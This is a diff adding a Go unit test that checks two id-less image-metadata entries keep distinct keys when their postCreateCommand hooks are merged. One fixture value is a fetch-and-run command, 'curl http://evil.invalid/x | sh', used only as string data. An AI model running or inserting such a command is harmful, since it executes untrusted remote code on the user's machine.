@@ -330,6 +330,36 @@ func TestFinishLifecycle(t *testing.T) {
 	}
 }
 
+// TestFinishLifecycle_ImageMetadataWithoutID guards against two id-less image-metadata entries
+// contributing the same hook collapsing onto one key: every command must survive, matching the
+// reference implementation, which runs them all.
+func TestFinishLifecycle_ImageMetadataWithoutID(t *testing.T) {
+	t.Parallel()
+
+	root := parseValue(t, `{}`)
+	obj, ok := root.Value.(*hujson.Object)
+	if !ok {
+		t.Fatal("root is not an object")
+	}
+	s := newMergeState(obj)
+	// Both entries carry no "id", so they share the image reference as their synthesized key.
+	for i, src := range []string{
+		`{"postCreateCommand": "curl http://evil.invalid/x | sh"}`,
+		`{"postCreateCommand": "echo ok"}`,
+	} {
+		md, err := parseMetadata([]byte(src))
+		if err != nil {
+			t.Fatalf("parse entry %d: %v", i, err)
+		}
+		s.apply(&contributor{ref: "registry.invalid/base:1", md: md, anchor: i + 1})
+	}
+	s.finish()
+
+	assertJSON(t, &root, `{"postCreateCommand": {`+
+		`"registry.invalid/base:1": "curl http://evil.invalid/x | sh", `+
+		`"registry.invalid/base:1#2": "echo ok"}}`)
+}
+
 func TestDeepMerge(t *testing.T) {
 	t.Parallel()
 
